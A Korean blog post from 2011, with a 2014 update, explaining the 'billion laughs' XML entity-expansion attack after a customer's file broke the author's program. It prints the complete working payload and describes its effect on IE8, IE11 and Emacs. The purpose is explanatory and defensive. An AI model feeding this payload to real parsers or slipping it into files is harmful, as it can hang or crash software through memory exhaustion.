date: 2011-04-14
tags: security
title: 교활한 XML
---
XML 파일이 프로그램을 죽일 수도 있다는 생각은 하지 못했다. XML은 그저 텍스트일 뿐이고 프로그램은 그저 파일을 읽어서 처리할 뿐인데... 그런데 다음과 같은 파일을 보고서야 그럴 수도 있다는 것을 알게 되었다.
<!-- more -->

```xml
<?xml version="1.0"?>
<!DOCTYPE billion [
<!ELEMENT billion (#PCDATA)>
<!ENTITY laugh0 "ha">
<!ENTITY laugh1 "&laugh0;&laugh0;">
<!ENTITY laugh2 "&laugh1;&laugh1;">
<!ENTITY laugh3 "&laugh2;&laugh2;">
<!ENTITY laugh4 "&laugh3;&laugh3;">
<!ENTITY laugh5 "&laugh4;&laugh4;">
<!ENTITY laugh6 "&laugh5;&laugh5;">
<!ENTITY laugh7 "&laugh6;&laugh6;">
<!ENTITY laugh8 "&laugh7;&laugh7;">
<!ENTITY laugh9 "&laugh8;&laugh8;">
<!ENTITY laugh10 "&laugh9;&laugh9;">
<!ENTITY laugh11 "&laugh10;&laugh10;">
<!ENTITY laugh12 "&laugh11;&laugh11;">
<!ENTITY laugh13 "&laugh12;&laugh12;">
<!ENTITY laugh14 "&laugh13;&laugh13;">
<!ENTITY laugh15 "&laugh14;&laugh14;">
<!ENTITY laugh16 "&laugh15;&laugh15;">
<!ENTITY laugh17 "&laugh16;&laugh16;">
<!ENTITY laugh18 "&laugh17;&laugh17;">
<!ENTITY laugh19 "&laugh18;&laugh18;">
<!ENTITY laugh20 "&laugh19;&laugh19;">
<!ENTITY laugh21 "&laugh20;&laugh20;">
<!ENTITY laugh22 "&laugh21;&laugh21;">
<!ENTITY laugh23 "&laugh22;&laugh22;">
<!ENTITY laugh24 "&laugh23;&laugh23;">
<!ENTITY laugh25 "&laugh24;&laugh24;">
<!ENTITY laugh26 "&laugh25;&laugh25;">
<!ENTITY laugh27 "&laugh26;&laugh26;">
<!ENTITY laugh28 "&laugh27;&laugh27;">
<!ENTITY laugh29 "&laugh28;&laugh28;">
<!ENTITY laugh30 "&laugh29;&laugh29;">
]>
<billion>&laugh30;</billion>
```

우리회사 프로그램이 제대로 처리하지 못한다며 고객이 보내준 XML 파일이다. 이 파일을 Chrome이나 Firefox와 같은 브라우저에서 열면 즉각 에러를 표시한다.

{% asset_img chrome.png %}

그러나 IE8에서 열면 브라우저 화면에 아무것도 나타나지 않지만 CPU를 계속 사용하고 메모리도 계속 늘어난다. 메모리 사용량이 거의 1GB가까지 늘어나는 것을 보고 죽여야 했다. IE8도 이 XML 파일을 제대로 처리하지 못하는 것이다.

파일 내용을 보면 `laugh0` ~ `laugh30`까지 31개의 엔터티를 정의하는데 `laugh0`은 "ha"로 정의되어 있고 나머지 엔터티는 이전 엔터티를 두번 참조하는 것으로 정의되어 있다. `laugh1`은 `laugh0`이 두번 나오는 것이고, `laugh2`는 `laugh1`이 두번 나오는 것이다. 이런 식으로 `laugh30`까지 간다. 따라서 엔터티를 모두 확장해보면...

```
laugh0 --> ha
laugh1 --> haha
laugh2 --> hahahaha
laugh3 --> hahahahahahahaha
laugh4 --> hahahahahahahahahahahahahahahaha
laugh5 --> hahahahahahahahahahahahahahahahahahahahahahahahahahahahahahahaha
...
```
`<billion>&laugh30;</billion>`을 표시하려면 "ha"를 2<sup>30</sup>번 표시해야 한다. 2<sup>30</sup>이면 1G에 해당하는 크기다. "ha"를 2바이트라고 하면 이 XML 문서를 표시하기 위해 2GB 길이의 문자열을 표시해야 하는 것이다.

이 교활한 XML 파일을 읽고는 프로그램이 죽어버리거나 제대로 처리하지 못하는 것도 이해할만하지만 잘 작성된 프로그램이라면 그러지 말아야 한다. Chrome이나 Firefox는 이런 문제가 생길 수 있다는 것을 즉각 알아채고 에러 메시지를 표시한다. 잘 작성된 프로그램이다. IE8은 그렇지 못하다.

이 XML 파일을 보고서야 XML 문서로 프로그램을 공격할 수 있다는 걸 알게 되었고, 프로그램을 작성할 때도 이런 공격에 대비를 해야 한다는 것도 알게 되었다.

## 업데이트 (2014-11-12)
* 윈도우7 IE11에서 위 XML 파일을 열어보면 예전의 IE8 처럼 삽질을 하지 않는다. 그저 조용히 맨 아랫줄 `<billion>&laugh30;</billion>`을 제거하고 아무런 에러 메시지도 표시하지 않는다. 브라우저가 멈춰버리지는 않지만 친절한 UX라 할 수는 없다.
* Emacs(24.4.1) 에디터에서 위 XML 파일을 열면 응답하지 않는 상태가 된다. XML 소스를 scratch 버퍼에 붙여넣는 것은 되지만 이를 XML 파일로 저장하려 하면 역시 응답하지 않는 상태가 된다. 프로세스가 CPU를 계속 사용하는 것으로 보아 뭔가 삽질을 하고 있는게 분명하다.
